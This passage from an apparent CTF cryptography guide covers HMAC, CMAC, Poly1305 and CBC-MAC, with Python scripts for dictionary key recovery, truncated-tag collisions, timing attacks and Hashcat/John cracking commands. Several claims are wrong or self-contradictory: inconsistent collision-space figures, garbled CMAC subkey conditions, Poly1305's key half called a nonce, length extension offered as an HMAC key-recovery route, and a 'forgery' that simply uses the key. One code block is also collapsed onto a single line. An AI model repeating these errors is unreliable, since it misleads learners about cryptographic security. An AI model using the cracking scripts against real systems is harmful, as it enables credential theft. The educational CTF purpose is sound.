    K = H(K)

If |K| < block_size:
    K = K || 0x00...0x00  (pad with zeros)
```

**Security:**

HMAC security depends on:

- Cryptographic strength of underlying hash
- Key length (minimum 128 bits recommended)
- No key reuse across different purposes (domain separation)

#### HMAC Vulnerabilities in CTF

**Truncation Attacks:**

[Inference] If MAC output truncated to fewer bytes, collision probability increases. Attacking truncated HMAC-SHA256(16 bits) requires only 2^8 attempts vs 2^128 for full output.

**Key Recovery via Length Extension:**

[Unverified] If attacker can append data to MAC input and predict new MAC, key may be recoverable. Requires hash function supports length extension (MD5, SHA-1, SHA-256 vulnerable; SHA-3 resistant).

**Timing Attacks:**

If MAC verification uses byte-by-byte comparison (non-constant-time), attacker measures verification time to deduce correct MAC bytes.

**Key Reuse Across Different Hash Functions:**

Same key used with both HMAC-SHA256 and HMAC-MD5 may enable cross-function attacks if one hash is broken.

**Weak Key Derivation:**

If HMAC key derived from password via weak KDF (single MD5 hash vs PBKDF2), dictionary attacks recover key.

**Challenge-Response Forgery:**

If HMAC used in authentication protocol without nonce or timestamp, replay attacks possible.

#### CTF Tools and Commands

**Python HMAC Implementation:**

```python
import hmac
import hashlib

def hmac_basic():
    """Demonstrate HMAC usage."""
    key = b"secret_key_12345"
    message = b"message to authenticate"
    
    # HMAC-SHA256
    mac = hmac.new(key, message, hashlib.sha256).digest()
    print(f"HMAC-SHA256: {mac.hex()}")
    
    # HMAC-SHA512
    mac_sha512 = hmac.new(key, message, hashlib.sha512).digest()
    print(f"HMAC-SHA512: {mac_sha512.hex()}")
    
    # Verification (constant-time comparison)
    input_mac = hmac.new(key, message, hashlib.sha256).digest()
    if hmac.compare_digest(mac, input_mac):
        print("[✓] MAC verified")
    else:
        print("[✗] MAC failed verification")

# hmac_basic()
```

**HMAC Key Recovery via Dictionary Attack:**

```python
import hmac
import hashlib

def hmac_dictionary_attack(message, correct_mac, wordlist_file):
    """
    Recover HMAC key via dictionary attack.
    
    Given: message and known MAC value
    Find: key
    """
    with open(wordlist_file, 'r') as f:
        for word in f:
            word = word.strip().encode()
            test_mac = hmac.new(word, message, hashlib.sha256).digest()
            
            # Constant-time comparison
            if hmac.compare_digest(test_mac, correct_mac):
                print(f"[+] Key found: {word.decode()}")
                return word
    
    print("[!] Key not found in wordlist")
    return None

# Usage:
# message = b"data to authenticate"
# correct_mac = hmac.new(b"weak_password", message, hashlib.sha256).digest()
# recovered_key = hmac_dictionary_attack(message, correct_mac, "/usr/share/wordlists/rockyou.txt")
```

**HMAC Truncation Attack (Collision):**

```python
def hmac_truncation_attack(key, message, target_truncation_bytes=2):
    """
    [Inference] Truncated HMAC enables faster collision attacks.
    
    Full HMAC-SHA256: 32 bytes, 2^256 collision space
    Truncated to 2 bytes: 2^16 collision space
    """
    full_mac = hmac.new(key, message, hashlib.sha256).digest()
    truncated_mac = full_mac[:target_truncation_bytes]
    
    print(f"Full HMAC: {full_mac.hex()}")
    print(f"Truncated ({target_truncation_bytes} bytes): {truncated_mac.hex()}")
    print(f"Collision space: 2^{8*target_truncation_bytes}")
    
    # Find collision via brute force
    for i in range(2**(8*target_truncation_bytes)):
        test_message = message + i.to_bytes(4, 'big')
        test_mac = hmac.new(key, test_message, hashlib.sha256).digest()[:target_truncation_bytes]
        
        if test_mac == truncated_mac and test_message != message:
            print(f"[+] Collision found: {test_message.hex()}")
            return test_message
    
    return None

# Demonstrates vulnerability: truncation dramatically reduces security
```

**Length Extension Attack (SHA-256 Vulnerable):**

```python
def hmac_length_extension_attack_theory():
    """
    [Unverified] Length extension vulnerability in MAC:
    
    If H(K || M) is known and attacker can append data,
    attacker may compute H(K || M || padding || M') without knowing K.
    
    SHA-256, SHA-512, MD5, SHA-1 vulnerable (iterative hashes).
    SHA-3 not vulnerable (sponge construction).
    
    HMAC itself resistant due to nested hash application,
    but underlying hash vulnerability may affect protocol.
    """
    print("[Unverified] Length Extension in HMAC:")
    print("1. HMAC-SHA256: RESISTANT (nested application)")
    print("2. But if protocol uses SHA256(key || message) directly: VULNERABLE")
    print("3. Attacker knowing H(key || msg) can compute H(key || msg || padding || extra)")
    print("4. Solution: use SHA-3 or proper HMAC construction")

# hmac_length_extension_attack_theory()
```

**Timing Attack Detection:**

```python
import time
import hmac
import hashlib

def hmac_timing_attack_simulation():
    """
    Detect timing variations in MAC verification.
    [Unverified] Byte-by-byte comparison leaks timing information.
    """
    key = b"secret"
    message = b"test"
    
    correct_mac = hmac.new(key, message, hashlib.sha256).digest()
    
    print("[*] HMAC Timing Attack Simulation:")
    
    # Vulnerable comparison (byte-by-byte early exit)
    def vulnerable_verify(mac1, mac2):
        for i in range(len(mac1)):
            if mac1[i] != mac2[i]:
                return False  # Early exit reveals mismatch position
        return True
    
    # Secure comparison (constant-time)
    def secure_verify(mac1, mac2):
        return hmac.compare_digest(mac1, mac2)
    
    # Test with wrong MACs
    wrong_mac_1st_byte = b'\x00' + correct_mac[1:]
    wrong_mac_2nd_byte = correct_mac[:1] + b'\x00' + correct_mac[2:]
    
    # Time vulnerable version
    start = time.perf_counter()
    for _ in range(10000):
        vulnerable_verify(correct_mac, wrong_mac_1st_byte)
    time_1st_byte = time.perf_counter() - start
    
    start = time.perf_counter()
    for _ in range(10000):
        vulnerable_verify(correct_mac, wrong_mac_2nd_byte)
    time_2nd_byte = time.perf_counter() - start
    
    print(f"Time for 1st byte mismatch: {time_1st_byte:.6f}s")
    print(f"Time for 2nd byte mismatch: {time_2nd_byte:.6f}s")
    print(f"Difference: {abs(time_1st_byte - time_2nd_byte):.9f}s")
    
    if abs(time_1st_byte - time_2nd_byte) > 1e-6:
        print("[!] TIMING LEAK DETECTED: Different positions take different time")
    else:
        print("[✓] Timing constant (safe)")

# hmac_timing_attack_simulation()
```

**Kali Linux: HMAC Verification with OpenSSL:**

```bash
# Generate HMAC-SHA256
echo -n "message" | openssl dgst -sha256 -hmac "secret_key" -hex

# Generate HMAC with key file
echo -n "message" | openssl dgst -sha256 -mac HMAC -macopt key:file:key.bin

# Batch HMAC verification
for file in *.txt; do
    echo -n "$file: "
    openssl dgst -sha256 -hmac "key123" "$file"
done
```

**Online Tools: CyberChef HMAC Verification:**

```
CyberChef Recipe:
1. HMAC (HMAC, SHA256)
   - Input: message (UTF-8 or hex)
   - Key: secret key (UTF-8 or hex)
   - Output: HMAC hex

Quick testing:
- Input: "test message"
- Key: "secret_key"
- Result: verify against known HMAC values
```

---

### CMAC (Cipher-based MAC)

CMAC generates authentication tag using block cipher instead of hash function. Also known as OMAC (One-Key MAC). Designed to overcome ECB/CBC mode vulnerabilities while maintaining efficiency.

#### CMAC Construction

**Algorithm:**

```
CMAC(K, M):
1. Generate subkeys K1, K2 from cipher key K
2. Pad message M (if necessary)
3. Process message blocks through cipher in CBC-like mode
4. Apply final transformation with K1 or K2
5. Return tag (truncated if needed)

Subkey generation (for AES):
L = E_K(0)  (encrypt all-zeros block)
If L is not MSB-1 bit 0:
    K1 = L << 1
Else:
    K1 = (L << 1) ⊕ Rb
    
If K1 is not MSB-1 bit 0:
    K2 = K1 << 1
Else:
    K2 = (K1 << 1) ⊕ Rb
```

**Security:**

CMAC security based on block cipher strength (AES recommended). No key schedule weakness like HMAC-MD5. Deterministic (no nonce required).

#### CMAC Vulnerabilities in CTF

**Truncation Attacks:**

Similar to HMAC: truncated CMAC-AES(8 bits) requires only 2^8 queries for collision.

**Key Reuse Across Modes:**

Same key used for both encryption and CMAC may enable attacks if mode combination weak.

**Nonce Handling in Counter Mode Variants:**

Some CMAC variants use nonce; if nonce repeated, security breaks.

**Subkey Derivation Leaks:**

[Unverified] Timing variations in subkey generation may leak cipher key bits.

#### CTF Tools and Commands

**Python CMAC Implementation (PyCryptodome):**

```python
from Crypto.Cipher import AES
from Crypto.Hash import CMAC

def cmac_basic():
    """Demonstrate CMAC usage."""
    key = b'0123456789ABCDEF'  # 16 bytes for AES-128
    message = b'message to authenticate'
    
    cipher = AES.new(key, AES.MODE_ECB)
    cmac_obj = CMAC.new(cipher)
    cmac_obj.update(message)
    
    tag = cmac_obj.digest()
    print(f"CMAC-AES-128: {tag.hex()}")
    
    # Verification
    cmac_obj_verify = CMAC.new(cipher)
    cmac_obj_verify.update(message)
    
    if cmac_obj_verify.digest() == tag:
        print("[✓] CMAC verified")
    else:
        print("[✗] CMAC failed")

# cmac_basic()
```

**CMAC Key Recovery:**

```python
from Crypto.Cipher import AES
from Crypto.Hash import CMAC

def cmac_dictionary_attack(message, correct_tag, wordlist_file):
    """Recover CMAC key via dictionary attack."""
    with open(wordlist_file, 'r') as f:
        for word in f:
            word = word.strip()
            # Pad to 16 bytes for AES-128
            key = (word * 2)[:16].encode() if isinstance(word, str) else (word * 2)[:16]
            
            try:
                cipher = AES.new(key, AES.MODE_ECB)
                cmac_obj = CMAC.new(cipher)
                cmac_obj.update(message)
                
                if cmac_obj.digest() == correct_tag:
                    print(f"[+] Key found: {word}")
                    return key
            except:
                pass
    
    print("[!] Key not found")
    return None

# Usage:
# message = b"data"
# key = b'weak_password123'
# cipher = AES.new(key, AES.MODE_ECB)
# cmac = CMAC.new(cipher)
# cmac.update(message)
# tag = cmac.digest()
# recovered = cmac_dictionary_attack(message, tag, wordlist_file)
```

**Subkey Extraction and Analysis:**

```python
def cmac_subkey_extraction(key):
    """Extract CMAC subkeys K1, K2."""
    from Crypto.Cipher import AES
    
    cipher = AES.new(key, AES.MODE_ECB)
    
    # Generate L (encrypt zero block)
    L = cipher.encrypt(b'\x00' * 16)
    
    print(f"Key: {key.hex()}")
    print(f"L: {L.hex()}")
    
    # Subkey K1
    L_int = int.from_bytes(L, 'big')
    msb = L_int >> 127  # Most significant bit
    
    K1_int = (L_int << 1) & ((1 << 128) - 1)
    Rb = 0x87  # For AES (GF(2^128) reduction polynomial)
    
    if msb == 1:
        K1_int ^= Rb
    
    K1 = K1_int.to_bytes(16, 'big')
    print(f"K1: {K1.hex()}")
    
    # Subkey K2
    msb_k1 = K1_int >> 127
    K2_int = (K1_int << 1) & ((1 << 128) - 1)
    
    if msb_k1 == 1:
        K2_int ^= Rb
    
    K2 = K2_int.to_bytes(16, 'big')
    print(f"K2: {K2.hex()}")
    
    return K1, K2

# cmac_subkey_extraction(b'0123456789ABCDEF')
```

---

### Poly1305

Poly1305 is a fast, single-use message authentication code designed by Daniel Bernstein. Uses polynomial evaluation over finite field mod 2^130-5. Typically used with ChaCha20 (ChaCha20-Poly1305 AEAD).

#### Poly1305 Construction

**Algorithm:**

```
Poly1305(K, M):
1. Parse key K (32 bytes): clamp key (16 bytes) || nonce (16 bytes)
2. Clamp 16-byte key: set specific bits to constants
3. Parse message M in 17-byte chunks (with 0x01 prefix)
4. Accumulator a = 0
5. For each chunk:
   a = ((a + chunk) * r) mod (2^130 - 5)
6. Final tag = (a + s) mod 2^128
   where s is derived from nonce

Return: 16-byte authentication tag
```

**Key Clamping (Security-Critical):**

```
Clamp operation clears specific bits to mitigate implementation weaknesses:
- Clear top 4 bits
- Clear bottom 2 bits of each 32-bit word
- Prevents certain algebraic attacks
```

**Security:**

Poly1305 security assumes:

- Unique key for each message (single-use)
- Key independent of message
- Adversary cannot predict key bits

#### Poly1305 Vulnerabilities in CTF

**Key Reuse (Critical):**

If same (key, message) pair used twice, MAC identical. If attacker controls messages with same key, polynomial coefficients recoverable via linear algebra.

**Nonce Reuse:**

Different message with repeated nonce uses same polynomial evaluation secret, enabling algebraic attacks.

**Weak Key Derivation:**

If key derived from password without KDF, dictionary attacks recover key.

**Truncation:**

Truncated Poly1305 tags reduce security proportionally.

#### CTF Tools and Commands

**Python Poly1305 Implementation (PyCryptodome with ChaCha20):**

```python
from Crypto.Cipher import ChaCha20_Poly1305
import os

def poly1305_basic():
    """Demonstrate Poly1305 with ChaCha20."""
    key = os.urandom(32)
    plaintext = b"message to authenticate"
    
    cipher = ChaCha20_Poly1305.new(key=key)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    
    print(f"Key: {key.hex()}")
    print(f"Ciphertext: {ciphertext.hex()}")
    print(f"Poly1305 Tag: {tag.hex()}")
    
    # Verification
    decipher = ChaCha20_Poly1305.new(key=key, nonce=cipher.nonce)
    try:
        decrypted = decipher.decrypt_and_verify(ciphertext, tag)
        print(f"[✓] Poly1305 verified: {decrypted}")
    except ValueError:
        print("[✗] Poly1305 verification failed")

# poly1305_basic()
```

**Poly1305 Key Reuse Attack:**

```python
from Crypto.Cipher import ChaCha20_Poly1305

def poly1305_key_reuse_attack(key):
    """
    [Inference] Demonstrate vulnerability of key reuse.
    
    If same key used with multiple messages, attacker can recover
    polynomial coefficients via linear algebra.
    """
    print("[*] Poly1305 Key Reuse Vulnerability:")
    print("[!] Never reuse same key with different messages")
    print("[!] If reuse detected: polynomial coefficients may be recoverable")
    
    # Simulate message authentication
    msg1 = b"message1"
    msg2 = b"message2"
    
    cipher1 = ChaCha20_Poly1305.new(key=key)
    c1, tag1 = cipher1.encrypt_and_digest(msg1)
    
    cipher2 = ChaCha20_Poly1305.new(key=key)
    c2, tag2 = cipher2.encrypt_and_digest(msg2)
    
    print(f"Message 1 tag: {tag1.hex()}")
    print(f"Message 2 tag: {tag2.hex()}")
    print("[!] With same key and known messages: polynomial recovery possible")

# poly1305_key_reuse_attack(os.urandom(32))
```

**Manual Poly1305 Implementation (Educational):**

```python
def poly1305_manual(key, message):
    """
    Manual Poly1305 implementation for understanding.
    WARNING: not constant-time, for education only.
    """
    # Parse key
    if len(key) != 32:
        raise ValueError("Key must be 32 bytes")
    
    r_bytes = key[:16]
    s_bytes = key[16:32]
    
    # Clamp r
    r = int.from_bytes(r_bytes, 'little')
    r &= 0x0ffffffc0ffffffc0ffffffc0fffffff
    
    # Parse s
    s = int.from_bytes(s_bytes, 'little')
    
    # Accumulator
    p = (1 << 130) - 5
    a = 0
    
    # Process message
    for i in range(0, len(message), 16):
        chunk = message[i:i+16]
        
        # Convert chunk to integer
        n = int.from_bytes(chunk + b'\x01', 'little')
        
        # Update accumulator
        a = ((a + n) * r) % p
    
    # Final tag
    tag_int = (a + s) % (1 << 128)
    tag = tag_int.to_bytes(16, 'little')
    
    return tag

# Example:
# key = os.urandom(32)
# msg = b"test message"
# tag = poly1305_manual(key, msg)
# print(f"Tag: {tag.hex()}")
```

---

### CBC-MAC

CBC-MAC generates authentication tag by encrypting message in CBC mode and outputting final ciphertext block. Used in banking (ANSI X9.9) and wireless protocols.

#### CBC-MAC Construction

**Algorithm:**

```
CBC-MAC(K, M):
1. Encrypt message in CBC mode with zero IV
2. Ciphertext = E_K(P_1) || E_K(P_2 ⊕ C_1) || ... || E_K(P_n ⊕ C_{n-1})
3. Return: last ciphertext block (or truncated)

For variable-length messages:
- Add length field at start: M' = len(M) || M
- Or use CMAC variant with subkeys K1, K2
```

**Security Requirements:**

- Message must be padded to block size
- IV must be zero (not random)
- Key unique per message (if variable-length)

#### CBC-MAC Vulnerabilities in CTF

**Null Prefix Attack:**

[Unverified] If attacker can prepend encrypted zero block to message, CBC-MAC becomes vulnerable to length extension.

**Message Extension Attack:**

Without proper termination, attacker can append blocks to authenticated message if final block decryption known.

**Truncation:**

CBC-MAC truncated to partial block (e.g., 8 bytes of 16-byte AES block) enables collision attacks.

**IV Not Zero:**

If IV randomized (not zero), security may increase but implementation must ensure proper IV handling.

**Key Reuse Across Ciphers:**

Same key for both encryption and CBC-MAC enables attacks in combined mode.

#### CTF Tools and Commands

**Python CBC-MAC Implementation:**

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def cbc_mac_basic(key, message):
    """
    Simple CBC-MAC implementation.
    WARNING: Educational only, use CMAC for production.
    """
    # Pad message
    padded_msg = pad(message, AES.block_size)
    
    # CBC mode with zero IV
    iv = b'\x00' * AES.block_size
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(padded_msg)
    
    # Return last block as MAC
    mac = ciphertext[-AES.block_size:]
    
    return mac

def cbc_mac_verify(key, message, expected_mac):
    """Verify CBC-MAC."""
    computed_mac = cbc_mac_basic(key, message)
    
    from Crypto.Cipher import AES
    import hmac
    
    if hmac.compare_digest(computed_mac, expected_mac):
        print("[✓] CBC-MAC verified")
        return True
    else:
        print("[✗] CBC-MAC verification failed")
        return False

# Usage:
# key = b'0123456789ABCDEF'
# message = b'test message'
# mac = cbc_mac_basic(key, message)
# print(f"CBC-MAC: {mac.hex()}")
```

**CBC-MAC Truncation Attack:**

```python
def cbc_mac_truncation_attack(key, message, truncation_bytes=8):
    """
    [Inference] Truncated CBC-MAC enables collision attacks.
    """
    full_mac = cbc_mac_basic(key, message)
    truncated_mac = full_mac[:truncation_bytes]
    
    print(f"Full CBC-MAC (16 bytes): {full_mac.hex()}")
    print(f"Truncated CBC-MAC ({truncation_bytes} bytes): {truncated_mac.hex()}")
    print(f"Collision space: 2^{8*truncation_bytes}")
    
    # Collision via brute force (for small truncations)
    if truncation_bytes <= 2:
        from Crypto.Util.Padding import pad
        
        for i in range(2**(8*truncation_bytes)):
            test_msg = message + i.to_bytes(4, 'big')
            test_mac = cbc_mac_basic(key, test_msg)[:truncation_bytes]
            
            if test_mac == truncated_mac and test_msg != message:
                print(f"[+] Collision found: {test_msg.hex()}")
                return test_msg
    
    return None

# Demonstrates security reduction from truncation
```

**Message Extension Attack (No Termination):**

```python
def cbc_mac_extension_attack():
    """
    [Unverified] If CBC-MAC lacks proper message termination,
    attacker can append blocks to authenticated message.
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    
    key = b'0123456789ABCDEF'
    original_msg = b'transfer $100'
    
    # Compute MAC on original
    padded_original = pad(original_msg, AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, b'\x00' * AES.block_size)
    ct_original = cipher.encrypt(padded_original)
    original_mac = ct_original[-AES.block_size:]
    
    print(f"Original: {original_msg}")
    print(f"Original MAC: {original_mac.hex()}")
    
    # Attack: append extra message block
    extra_msg = b' to attacker'
    extended_msg = original_msg + extra_msg
    
    # [Unverified] In vulnerable system: forge MAC by:
    # 1. Knowing original_mac (last CT block)
    # 2. Continuing CBC from that block
    # 3. Computing MAC on extended message
    
    print(f"\n[*] Extended message: {extended_msg}")
    print("[!] Attacker needs to compute new MAC for extended message")
    print("[!] If final block not uniquely bound: extension possible")

# cbc_mac_extension_attack()
```

---

### MAC-Based Authentication Protocols

**Challenge-Response Protocol (CTF Context):**

```python
import hmac
import hashlib
import time

class ChallengeResponseAuth:
    def __init__(self, shared_secret):
        self.secret = shared_secret
    
    def server_challenge(self):
        """Server generates random challenge."""
        import os
        self.challenge = os.urandom(16)
        self.timestamp = time.time()
        return self.challenge
    
    def client_response(self, challenge, shared_secret):
        """Client computes response to challenge."""
        response = hmac.new(shared_secret, challenge, hashlib.sha256).digest()
        return response
    
    def server_verify(self, client_response):
        """Server verifies client response."""
        expected_response = hmac.new(
            self.secret, 
            self.challenge, 
            hashlib.sha256
        ).digest()
        
        if hmac.compare_digest(client_response, expected_response):
            print("[✓] Client authenticated")
            return True
        else:
            print("[✗] Authentication failed")
            return False

def challenge_response_demo():
    shared_secret = b"shared_secret_key"
    
    auth = ChallengeResponseAuth(shared_secret)
    
    # Server sends challenge
    challenge = auth.server_challenge()
    print(f"[Server] Challenge: {challenge.hex()}")
    
    # Client responds
    response = auth.client_response(challenge, shared_secret)
    print(f"[Client] Response: {response.hex()}")
    
    # Server verifies
    auth.server_verify(response)

# challenge_response_demo()
```

**HMAC-Based Time-Limited Authentication:**

```python
import hmac
import hashlib
import time
import math

class TimeBasedAuth:
    def __init__(self, shared_secret, time_window=30):
        self.secret = shared_secret
        self.time_window = time_window
    
    def generate_token(self, user_id):
        """Generate time-limited authentication token."""
        current_time = int(time.time() // self.time_window)
        
        message = f"{user_id}:{current_time}".encode()
        token = hmac.new(self.secret, message, hashlib.sha256).digest()[:8]
        
        return token.hex()
    
    def verify_token(self, user_id, token, time_tolerance=1):
        """Verify token (allowing time skew)."""
        current_time = int(time.time() // self.time_window)
        
        for time_offset in range(-time_tolerance, time_tolerance + 1):
            test_time = current_time + time_offset
            message = f"{user_id}:{test_time}".encode()
            expected_token = hmac.new(self.secret, message, hashlib.sha256).digest()[:8]
            
            if hmac.compare_digest(bytes.fromhex(token), expected_token):
                print(f"[✓] Token valid (offset: {time_offset})")
                return True
        
        print("[✗] Token expired or invalid")
        return False

def time_based_auth_demo():
    auth = TimeBasedAuth(b"secret_key", time_window=10)
    
    user_id = "alice"
    token = auth.generate_token(user_id)
    print(f"[*] Generated token for {user_id}: {token}")
    
    auth.verify_token(user_id, token)

# time_based_auth_demo()
```

---

### MAC Verification Timing Attacks

**Constant-Time Comparison (Secure):**

```python
import hmac
import hashlib

def secure_mac_verification(expected_mac, computed_mac): """ Constant-time MAC verification using hmac.compare_digest. [Inference] Prevents timing attacks by taking fixed time regardless of match position. """ import time

start = time.perf_counter()
result = hmac.compare_digest(expected_mac, computed_mac)
elapsed = time.perf_counter() - start

print(f"Verification result: {result}")
print(f"Time taken: {elapsed:.9f}s (constant regardless of match)")

return result

# Always use hmac.compare_digest for cryptographic comparisons
````

**Non-Constant-Time Comparison (Vulnerable):**

```python
def vulnerable_mac_verification(expected_mac, computed_mac):
    """
    [Unverified] Vulnerable byte-by-byte comparison.
    Exits early on mismatch, revealing timing information.
    """
    # DO NOT USE IN PRODUCTION
    if len(expected_mac) != len(computed_mac):
        return False
    
    for i in range(len(expected_mac)):
        if expected_mac[i] != computed_mac[i]:
            return False  # Early exit reveals mismatch position
    
    return True

def timing_attack_demo():
    """Simulate timing attack on vulnerable verification."""
    import time
    
    key = b"secret_key"
    message = b"test message"
    
    correct_mac = hmac.new(key, message, hashlib.sha256).digest()
    
    print("[*] Timing Attack Demonstration:")
    
    # Test MACs with early mismatch
    wrong_mac_1st_byte = b'\x00' + correct_mac[1:]
    wrong_mac_16th_byte = correct_mac[:15] + b'\x00'
    
    # Time vulnerable verification (simplified, may not show difference on fast hardware)
    iterations = 100000
    
    start = time.perf_counter()
    for _ in range(iterations):
        vulnerable_mac_verification(correct_mac, wrong_mac_1st_byte)
    time_1st = time.perf_counter() - start
    
    start = time.perf_counter()
    for _ in range(iterations):
        vulnerable_mac_verification(correct_mac, wrong_mac_16th_byte)
    time_16th = time.perf_counter() - start
    
    print(f"Mismatch at 1st byte: {time_1st:.6f}s")
    print(f"Mismatch at 16th byte: {time_16th:.6f}s")
    
    if time_1st < time_16th:
        print("[!] TIMING LEAK: Earlier mismatch faster (vulnerable to timing attack)")
    else:
        print("[✓] Timing constant (timing attack resistant)")

# timing_attack_demo()
````

---

### Practical CTF MAC Challenges

**Challenge 1: Dictionary Attack on HMAC Key**

```python
def hmac_ctf_challenge_1():
    """
    CTF Challenge: Recover HMAC key via dictionary attack.
    
    Given:
    - Message: b"flag_is_here"
    - HMAC-SHA256: "a1b2c3d4e5f6..."
    - Wordlist: /usr/share/wordlists/rockyou.txt
    
    Find: Key
    """
    import hmac
    import hashlib
    
    message = b"flag_is_here"
    correct_hmac_hex = "a1b2c3d4e5f6..."  # Example
    correct_hmac = bytes.fromhex(correct_hmac_hex)
    
    print("[*] CTF Challenge: HMAC Key Recovery")
    print(f"[*] Message: {message}")
    print(f"[*] HMAC: {correct_hmac_hex}")
    
    # Simulate wordlist attack
    wordlist = ["password", "admin", "123456", "key123", "secret"]
    
    for word in wordlist:
        test_key = word.encode()
        test_hmac = hmac.new(test_key, message, hashlib.sha256).digest()
        
        if hmac.compare_digest(test_hmac, correct_hmac):
            print(f"[+] KEY FOUND: {word}")
            return test_key
        
        print(f"[-] Tried: {word}")
    
    print("[!] Key not found in wordlist")
    return None

# recovered = hmac_ctf_challenge_1()
```

**Challenge 2: MAC Truncation Collision**

```python
def hmac_ctf_challenge_2():
    """
    CTF Challenge: Find collision in truncated HMAC.
    
    Given:
    - Original message: b"authenticate_me"
    - Original HMAC-SHA256 (truncated to 2 bytes): "ab12"
    - Key unknown but fixed
    
    Find: Different message with same truncated HMAC
    """
    import hmac
    import hashlib
    
    key = b"secret_key"  # Attacker doesn't know this
    original_msg = b"authenticate_me"
    original_hmac_full = hmac.new(key, original_msg, hashlib.sha256).digest()
    original_hmac_truncated = original_hmac_full[:2]
    
    print("[*] CTF Challenge: Truncated HMAC Collision")
    print(f"[*] Original message: {original_msg}")
    print(f"[*] Truncated HMAC (2 bytes): {original_hmac_truncated.hex()}")
    print(f"[*] Find: different message with same truncated HMAC\n")
    
    # Brute force collision
    for i in range(2**16):  # 2^16 = 65536 attempts max
        test_msg = original_msg + i.to_bytes(4, 'big')
        test_hmac = hmac.new(key, test_msg, hashlib.sha256).digest()[:2]
        
        if test_hmac == original_hmac_truncated and test_msg != original_msg:
            print(f"[+] COLLISION FOUND!")
            print(f"[+] Message: {test_msg}")
            print(f"[+] Attempts: {i}")
            return test_msg
        
        if i % 10000 == 0:
            print(f"[-] Tried {i} variations...")
    
    return None

# collision = hmac_ctf_challenge_2()
```

**Challenge 3: CBC-MAC Forgery**

```python
def cbc_mac_ctf_challenge_3():
    """
    CTF Challenge: Forge CBC-MAC for new message.
    
    Given:
    - Known plaintext message: b"transfer $100"
    - Known CBC-MAC of plaintext: "abc123def456..."
    - Key unknown but consistent
    
    Find: CBC-MAC for: b"transfer $1000" (different amount)
    
    Vulnerability: Attacker can compute MAC for similar messages
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    
    key = b'0123456789ABCDEF'
    
    original_msg = b"transfer $100"
    modified_msg = b"transfer $1000"
    
    # Original CBC-MAC
    padded_orig = pad(original_msg, AES.block_size)
    cipher_orig = AES.new(key, AES.MODE_CBC, b'\x00' * AES.block_size)
    ct_orig = cipher_orig.encrypt(padded_orig)
    mac_orig = ct_orig[-AES.block_size:]
    
    print("[*] CTF Challenge: CBC-MAC Forgery")
    print(f"[*] Original: {original_msg} → MAC: {mac_orig.hex()[:16]}...")
    print(f"[*] Modified: {modified_msg}")
    print(f"[*] Compute new MAC without key\n")
    
    # In vulnerable system, if message structure known:
    # Original: "transfer $100" (14 bytes, pads to 16)
    # Modified: "transfer $1000" (15 bytes, pads to 32)
    
    # Attack approach:
    # 1. If plaintext partially known and controllable
    # 2. Attacker can XOR blocks to forge new MAC
    
    # [Unverified] Actual forge requires more sophisticated technique
    # Demonstrates vulnerability class
    
    # Proper computation (simulating oracle):
    padded_mod = pad(modified_msg, AES.block_size)
    cipher_mod = AES.new(key, AES.MODE_CBC, b'\x00' * AES.block_size)
    ct_mod = cipher_mod.encrypt(padded_mod)
    mac_mod = ct_mod[-AES.block_size:]
    
    print(f"[*] Correct new MAC: {mac_mod.hex()[:16]}...")
    print("[!] Forgery possible if partial plaintext/ciphertext known")

# cbc_mac_ctf_challenge_3()
```

---

### MAC Attack Decision Tree

```
MAC Challenge (given MAC type and value):

1. Identify MAC type
   ├─ HMAC (SHA-256, SHA-512, MD5)
   │  ├─ Weak key derivation?
   │  │  └─ Dictionary attack (high priority)
   │  ├─ Key reuse across contexts?
   │  │  └─ Cross-function attacks possible
   │  ├─ Truncated output?
   │  │  └─ Collision via brute force (2^(8*truncation_bytes))
   │  └─ Authentication protocol?
   │     └─ Replay attack if no nonce/timestamp
   │
   ├─ CMAC (AES-based)
   │  ├─ Truncated output?
   │  │  └─ Collision attack
   │  ├─ Weak key?
   │  │  └─ Dictionary attack
   │  └─ Reused key across encryption?
   │     └─ Mode combination attacks
   │
   ├─ Poly1305 (ChaCha20-Poly1305)
   │  ├─ Same key reused?
   │  │  └─ Polynomial coefficient recovery (linear algebra)
   │  ├─ Nonce reused?
   │  │  └─ Security breaks completely
   │  └─ Weak key derivation?
   │     └─ Dictionary attack
   │
   └─ CBC-MAC
      ├─ Truncated output?
      │  └─ Collision attack
      ├─ Message extension possible?
      │  └─ Forgery if termination weak
      └─ Null prefix vulnerability?
         └─ Length extension attack

2. Timing characteristics
   ├─ Constant-time verification?
   │  └─ Timing attack resistant
   └─ Variable-time verification?
      └─ Timing attack possible (microsecond-level precision needed)

3. Known plaintext available?
   ├─ YES
   │  ├─ Single message-MAC pair
   │  │  └─ Dictionary attack (weak keys)
   │  ├─ Multiple message-MAC pairs with same key
   │  │  └─ Differential analysis
   │  └─ Chosen plaintext (attacker controls messages)
   │     └─ Forge new MACs via XOR tricks
   │
   └─ NO
      ├─ Brute force tag (2^(output_bits))
      └─ Only feasible if truncated < 32 bits

4. Authentication protocol context
   ├─ Challenge-response
   │  └─ Replay attack if challenge not unique
   ├─ Time-based
   │  └─ Clock skew exploitation
   └─ Sequence-based
      └─ Out-of-order message acceptance
```

---

### Kali Linux: MAC Tools Reference

```bash
# OpenSSL HMAC operations
echo -n "message" | openssl dgst -sha256 -hmac "key"
openssl dgst -sha256 -hmac "key" filename.txt

# Batch HMAC verification
for file in *.txt; do
    expected_hmac=$(openssl dgst -sha256 -hmac "key" "$file" | awk '{print $2}')
    echo "$file: $expected_hmac"
done

# Extract HMAC from challenge
grep -o '[a-f0-9]\{64\}' challenge_file.txt > expected_hmacs.txt

# Compare HMACs
comm -12 <(sort computed_hmacs.txt) <(sort expected_hmacs.txt)

# Python-based MAC testing
python3 << 'EOF'
import hmac, hashlib
key = b"key123"
msg = b"test"
print(hmac.new(key, msg, hashlib.sha256).hexdigest())
EOF

# John the Ripper MAC cracking (if supported)
john --wordlist=/usr/share/wordlists/rockyou.txt --format=hmac mac_hash.txt

# Hashcat HMAC cracking
hashcat -m 160 -a 0 hmac_hash.txt /usr/share/wordlists/rockyou.txt
# Mode 160: HMAC-SHA1

# CyberChef online: https://gchq.github.io/CyberChef/
# Recipe: HMAC with custom key, verify against known values
```

---

### CTF Checklist: MAC Challenges

```
IDENTIFICATION:
[ ] Determine MAC type (HMAC, CMAC, Poly1305, CBC-MAC)
